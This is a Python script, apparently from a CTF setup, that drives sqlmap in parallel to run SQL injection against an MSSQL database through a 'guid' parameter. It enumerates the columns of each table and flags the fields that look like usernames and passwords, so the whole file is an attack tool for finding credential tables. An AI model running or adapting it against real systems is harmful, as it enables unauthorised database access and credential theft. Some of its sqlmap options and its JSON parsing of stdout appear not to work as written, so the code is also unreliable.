import os
import subprocess
import re
import json
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

##  自动化并加速通过sqlmap进行数据库信息获取
# 配置项
sqlmap_path = "E:\\CTF\\Sqlmap\\sqlmap.py"
python_path = "E:\\Python\\Python3.12\\python.exe"
tables_file = "E:\\CTF\\tables.txt"
output_file = "columns_and_fields.json"
log_file = "sqlmap_log.txt"

# 固定参数配置
sqlmap_base_args = [
    "--level", "5",
    "--risk", "3",
    "--dbms", "mssql",
    "-p", "guid",
    "--batch",           # 禁止所有交互提示
    "--disable-coloring", # 禁用颜色输出
    "--no-cast",          # 禁止类型转换
    "--output-format=json",  # 确保输出为 JSON 格式
]
db_name = "EIS"
request_file = "E:\\CTF\\Sqlmap\\1.txt"

# 匹配关键词
username_keywords = ["user", "username", "account", "login"]
password_keywords = ["password", "passwd", "pwd", "pass"]

# 设置环境变量，强制不交互
os.environ['SQLMAP_NO_INTERACT'] = '1'

# 定义无关表名的正则模式
exclude_patterns = re.compile(r"(temp|log|test|backup|archive)", re.IGNORECASE)

# 读取表名并去重
with open(tables_file, "r", encoding="utf-8") as f:
    table_names = list(OrderedDict.fromkeys(line.strip() for line in f if line.strip()))


# 定义日志记录函数
def log_message(message):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with open(log_file, "a", encoding="utf-8") as log:
        log.write(f"{timestamp} {message}\n")


# 定义查询函数
def query_columns(table):
    if exclude_patterns.search(table):
        return {"table": table, "status": "excluded", "message": f"表 {table} 被排除"}

    command = [
        python_path, sqlmap_path,
        "-r", request_file,
        "-D", db_name,
        "-T", table,
        "--columns",
    ] + sqlmap_base_args

    try:
        # 捕获输出并运行命令
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            check=True
        )

        # 解析 JSON 输出
        output_json = json.loads(result.stdout.strip())
        columns = output_json.get("columns", [])
        if not columns:
            return {"table": table, "status": "no_columns", "message": "没有列信息"}

        # 提取可能的用户名和密码字段
        username_fields = [col["name"] for col in columns if any(keyword in col["name"].lower() for keyword in username_keywords)]
        password_fields = [col["name"] for col in columns if any(keyword in col["name"].lower() for keyword in password_keywords)]

        # 构造结果
        return {
            "table": table,
            "status": "success",
            "columns": columns,
            "potential_usernames": username_fields,
            "potential_passwords": password_fields,
            "is_account_table": bool(username_fields and password_fields)
        }

    except subprocess.CalledProcessError as e:
        stderr = e.stderr.strip() if e.stderr else "无错误信息"
        return {"table": table, "status": "error", "message": f"查询失败：{stderr}"}
    except json.JSONDecodeError:
        return {"table": table, "status": "error", "message": "输出不是有效的 JSON"}
    except Exception as e:
        return {"table": table, "status": "error", "message": f"未知错误：{e}"}


# 主程序
if __name__ == "__main__":
    print("[*] 开始并行处理表信息...")
    log_message("[*] 开始处理表信息")

    # 使用线程池并行处理
    num_threads = min(20, len(table_names))  # 根据表数量限制线程数
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        results = list(executor.map(query_columns, table_names))

    # 将结果写入 JSON 输出文件
    with open(output_file, "w", encoding="utf-8") as output:
        json.dump(results, output, indent=4, ensure_ascii=False)

    print(f"[+] 任务完成，结果已保存到 {output_file}")
    log_message(f"[+] 任务完成，结果已保存到 {output_file}")
